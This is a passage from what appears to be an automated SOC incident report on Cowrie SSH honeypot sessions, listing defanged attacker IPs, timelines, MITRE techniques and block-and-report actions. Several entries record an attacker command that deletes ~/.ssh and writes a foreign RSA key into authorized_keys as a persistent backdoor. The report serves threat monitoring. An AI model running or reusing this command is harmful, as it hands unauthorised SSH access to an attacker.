| `2026-04-14 17:58:02` | `cowrie.session.connect` |
| `2026-04-14 17:58:02` | `cowrie.client.version` |
| `2026-04-14 17:58:02` | `cowrie.client.kex` |
| `2026-04-14 17:58:03` | `cowrie.login.success` |
| `2026-04-14 17:58:03` | `cowrie.session.params` |
| `2026-04-14 17:58:03` | `cowrie.command.input` |
| `2026-04-14 17:58:03` | `cowrie.command.failed` |
| `2026-04-14 17:58:03` | `cowrie.log.closed` |
| `2026-04-14 17:58:03` | `cowrie.session.params` |
| `2026-04-14 17:58:03` | `cowrie.command.input` |
| `2026-04-14 17:58:03` | `cowrie.session.file_download` |
| `2026-04-14 17:58:03` | `cowrie.log.closed` |
| `2026-04-14 17:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23b2d37ac647

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:58 |
| **Last Seen** | 2026-04-14 17:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:58:05` | `cowrie.session.connect` |
| `2026-04-14 17:58:05` | `cowrie.client.version` |
| `2026-04-14 17:58:05` | `cowrie.client.kex` |
| `2026-04-14 17:58:06` | `cowrie.login.success` |
| `2026-04-14 17:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-034c779f32d9

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:58 |
| **Last Seen** | 2026-04-14 17:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:58:45` | `cowrie.session.connect` |
| `2026-04-14 17:58:45` | `cowrie.client.version` |
| `2026-04-14 17:58:45` | `cowrie.client.kex` |
| `2026-04-14 17:58:46` | `cowrie.login.success` |
| `2026-04-14 17:58:47` | `cowrie.session.params` |
| `2026-04-14 17:58:47` | `cowrie.command.input` |
| `2026-04-14 17:58:47` | `cowrie.command.failed` |
| `2026-04-14 17:58:47` | `cowrie.log.closed` |
| `2026-04-14 17:58:48` | `cowrie.session.params` |
| `2026-04-14 17:58:48` | `cowrie.command.input` |
| `2026-04-14 17:58:48` | `cowrie.session.file_download` |
| `2026-04-14 17:58:48` | `cowrie.log.closed` |
| `2026-04-14 17:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87e697a36a50

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 17:58 |
| **Last Seen** | 2026-04-14 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:58:51` | `cowrie.session.connect` |
| `2026-04-14 17:58:51` | `cowrie.client.version` |
| `2026-04-14 17:58:51` | `cowrie.client.kex` |
| `2026-04-14 17:58:52` | `cowrie.login.success` |
| `2026-04-14 17:58:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b514012c383f

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:59 |
| **Last Seen** | 2026-04-14 17:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:59:38` | `cowrie.session.connect` |
| `2026-04-14 17:59:38` | `cowrie.client.version` |
| `2026-04-14 17:59:38` | `cowrie.client.kex` |
| `2026-04-14 17:59:39` | `cowrie.login.success` |
| `2026-04-14 17:59:39` | `cowrie.session.params` |
| `2026-04-14 17:59:39` | `cowrie.command.input` |
| `2026-04-14 17:59:39` | `cowrie.command.failed` |
| `2026-04-14 17:59:39` | `cowrie.log.closed` |
| `2026-04-14 17:59:39` | `cowrie.session.params` |
| `2026-04-14 17:59:39` | `cowrie.command.input` |
| `2026-04-14 17:59:39` | `cowrie.session.file_download` |
| `2026-04-14 17:59:39` | `cowrie.log.closed` |
| `2026-04-14 17:59:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4257f8ac50f

| Field | Detail |
|---|---|
| **Source IP** | `118.193.33[.]228` |
| **First Seen** | 2026-04-14 17:59 |
| **Last Seen** | 2026-04-14 17:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 17:59:41` | `cowrie.session.connect` |
| `2026-04-14 17:59:41` | `cowrie.client.version` |
| `2026-04-14 17:59:41` | `cowrie.client.kex` |
| `2026-04-14 17:59:42` | `cowrie.login.success` |
| `2026-04-14 17:59:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.33[.]228` to AbuseIPDB if not already reported
- [ ] Block `118.193.33[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c63e82e42317

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 18:01 |
| **Last Seen** | 2026-04-14 18:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:01:13` | `cowrie.session.connect` |
| `2026-04-14 18:01:13` | `cowrie.client.version` |
| `2026-04-14 18:01:13` | `cowrie.client.kex` |
| `2026-04-14 18:01:13` | `cowrie.login.success` |
| `2026-04-14 18:01:14` | `cowrie.session.params` |
| `2026-04-14 18:01:14` | `cowrie.command.input` |
| `2026-04-14 18:01:14` | `cowrie.command.failed` |
| `2026-04-14 18:01:14` | `cowrie.log.closed` |
| `2026-04-14 18:01:14` | `cowrie.session.params` |
| `2026-04-14 18:01:14` | `cowrie.command.input` |
| `2026-04-14 18:01:14` | `cowrie.session.file_download` |
| `2026-04-14 18:01:14` | `cowrie.log.closed` |
| `2026-04-14 18:01:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f62c10ac3f5

| Field | Detail |
|---|---|
| **Source IP** | `103.146.159[.]14` |
| **First Seen** | 2026-04-14 18:01 |
| **Last Seen** | 2026-04-14 18:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:01:16` | `cowrie.session.connect` |
| `2026-04-14 18:01:16` | `cowrie.client.version` |
| `2026-04-14 18:01:16` | `cowrie.client.kex` |
| `2026-04-14 18:01:16` | `cowrie.login.success` |
| `2026-04-14 18:01:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.159[.]14` to AbuseIPDB if not already reported
- [ ] Block `103.146.159[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6165db7fc1f

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 18:01 |
| **Last Seen** | 2026-04-14 18:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:01:34` | `cowrie.session.connect` |
| `2026-04-14 18:01:34` | `cowrie.client.version` |
| `2026-04-14 18:01:35` | `cowrie.client.kex` |
| `2026-04-14 18:01:36` | `cowrie.login.success` |
| `2026-04-14 18:01:36` | `cowrie.session.params` |
| `2026-04-14 18:01:36` | `cowrie.command.input` |
| `2026-04-14 18:01:36` | `cowrie.command.failed` |
| `2026-04-14 18:01:37` | `cowrie.log.closed` |
| `2026-04-14 18:01:37` | `cowrie.session.params` |
| `2026-04-14 18:01:37` | `cowrie.command.input` |
| `2026-04-14 18:01:38` | `cowrie.session.file_download` |
| `2026-04-14 18:01:38` | `cowrie.log.closed` |
| `2026-04-14 18:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa7d72e02c08

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 18:01 |
| **Last Seen** | 2026-04-14 18:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:01:41` | `cowrie.session.connect` |
| `2026-04-14 18:01:41` | `cowrie.client.version` |
| `2026-04-14 18:01:42` | `cowrie.client.kex` |
| `2026-04-14 18:01:43` | `cowrie.login.success` |
| `2026-04-14 18:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baa2b522984d

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 18:02 |
| **Last Seen** | 2026-04-14 18:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:02:20` | `cowrie.session.connect` |
| `2026-04-14 18:02:20` | `cowrie.client.version` |
| `2026-04-14 18:02:20` | `cowrie.client.kex` |
| `2026-04-14 18:02:21` | `cowrie.login.success` |
| `2026-04-14 18:02:21` | `cowrie.session.params` |
| `2026-04-14 18:02:21` | `cowrie.command.input` |
| `2026-04-14 18:02:21` | `cowrie.command.failed` |
| `2026-04-14 18:02:21` | `cowrie.log.closed` |
| `2026-04-14 18:02:21` | `cowrie.session.params` |
| `2026-04-14 18:02:21` | `cowrie.command.input` |
| `2026-04-14 18:02:21` | `cowrie.session.file_download` |
| `2026-04-14 18:02:21` | `cowrie.log.closed` |
| `2026-04-14 18:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bc8cdaadcac

| Field | Detail |
|---|---|
| **Source IP** | `43.163.127[.]183` |
| **First Seen** | 2026-04-14 18:02 |
| **Last Seen** | 2026-04-14 18:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:02:23` | `cowrie.session.connect` |
| `2026-04-14 18:02:23` | `cowrie.client.version` |
| `2026-04-14 18:02:23` | `cowrie.client.kex` |
| `2026-04-14 18:02:23` | `cowrie.login.success` |
| `2026-04-14 18:02:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.127[.]183` to AbuseIPDB if not already reported
- [ ] Block `43.163.127[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4110d0361e5

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 18:03 |
| **Last Seen** | 2026-04-14 18:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:03:15` | `cowrie.session.connect` |
| `2026-04-14 18:03:15` | `cowrie.client.version` |
| `2026-04-14 18:03:16` | `cowrie.client.kex` |
| `2026-04-14 18:03:17` | `cowrie.login.success` |
| `2026-04-14 18:03:18` | `cowrie.session.params` |
| `2026-04-14 18:03:18` | `cowrie.command.input` |
| `2026-04-14 18:03:18` | `cowrie.command.failed` |
| `2026-04-14 18:03:18` | `cowrie.log.closed` |
| `2026-04-14 18:03:19` | `cowrie.session.params` |
| `2026-04-14 18:03:19` | `cowrie.command.input` |
| `2026-04-14 18:03:19` | `cowrie.session.file_download` |
| `2026-04-14 18:03:19` | `cowrie.log.closed` |
| `2026-04-14 18:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-777ac377407c

| Field | Detail |
|---|---|
| **Source IP** | `38.19.156[.]18` |
| **First Seen** | 2026-04-14 18:03 |
| **Last Seen** | 2026-04-14 18:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:03:22` | `cowrie.session.connect` |
| `2026-04-14 18:03:22` | `cowrie.client.version` |
| `2026-04-14 18:03:23` | `cowrie.client.kex` |
| `2026-04-14 18:03:24` | `cowrie.login.success` |
| `2026-04-14 18:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.19.156[.]18` to AbuseIPDB if not already reported
- [ ] Block `38.19.156[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ae216b467b2

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 18:03 |
| **Last Seen** | 2026-04-14 18:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:03:38` | `cowrie.session.connect` |
| `2026-04-14 18:03:38` | `cowrie.client.version` |
| `2026-04-14 18:03:39` | `cowrie.client.kex` |
| `2026-04-14 18:03:40` | `cowrie.login.success` |
| `2026-04-14 18:03:40` | `cowrie.session.params` |
| `2026-04-14 18:03:40` | `cowrie.command.input` |
| `2026-04-14 18:03:40` | `cowrie.command.failed` |
| `2026-04-14 18:03:40` | `cowrie.log.closed` |
| `2026-04-14 18:03:41` | `cowrie.session.params` |
| `2026-04-14 18:03:41` | `cowrie.command.input` |
| `2026-04-14 18:03:41` | `cowrie.session.file_download` |
| `2026-04-14 18:03:41` | `cowrie.log.closed` |
| `2026-04-14 18:03:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc0a23e59156

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 18:03 |
| **Last Seen** | 2026-04-14 18:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:03:44` | `cowrie.session.connect` |
| `2026-04-14 18:03:44` | `cowrie.client.version` |
| `2026-04-14 18:03:44` | `cowrie.client.kex` |
| `2026-04-14 18:03:45` | `cowrie.login.success` |
| `2026-04-14 18:03:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5244c6bd1548

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 18:06 |
| **Last Seen** | 2026-04-14 18:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:06:10` | `cowrie.session.connect` |
| `2026-04-14 18:06:10` | `cowrie.client.version` |
| `2026-04-14 18:06:10` | `cowrie.client.kex` |
| `2026-04-14 18:06:11` | `cowrie.login.success` |
| `2026-04-14 18:06:12` | `cowrie.session.params` |
| `2026-04-14 18:06:12` | `cowrie.command.input` |
| `2026-04-14 18:06:12` | `cowrie.command.failed` |
| `2026-04-14 18:06:12` | `cowrie.log.closed` |
| `2026-04-14 18:06:13` | `cowrie.session.params` |
| `2026-04-14 18:06:13` | `cowrie.command.input` |
| `2026-04-14 18:06:13` | `cowrie.session.file_download` |
| `2026-04-14 18:06:13` | `cowrie.log.closed` |
| `2026-04-14 18:06:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.23.198[.]86` to AbuseIPDB if not already reported
- [ ] Block `103.23.198[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-896103491feb

| Field | Detail |
|---|---|
| **Source IP** | `103.23.198[.]86` |
| **First Seen** | 2026-04-14 18:06 |
| **Last Seen** | 2026-04-14 18:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 18:06:16` | `cowrie.session.connect` |
| `2026-04-14 18:06:16` | `cowrie.client.version` |
| `2026-04-14 18:06:16` | `cowrie.client.kex` |
